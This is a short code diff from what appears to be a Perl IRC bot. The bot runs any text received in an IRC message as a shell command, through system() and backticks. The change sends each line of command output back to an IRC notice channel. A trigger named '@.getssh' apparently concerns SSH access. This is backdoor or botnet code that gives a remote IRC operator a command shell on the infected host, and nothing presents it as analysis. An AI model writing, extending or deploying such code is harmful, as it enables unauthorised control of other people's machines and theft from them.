@@ -70,7 +70,7 @@ $irc->on(irc_privmsg => sub {
              system("$msg");
              my @output = `$msg 2>&1 3>&1`;
              foreach(@output) {
-               printa("$_\r\n");
+               $irc->write(notice => $noticechan => "$_\r\n");         
              }
  }
   if ($msg =~ /@.getssh/) {
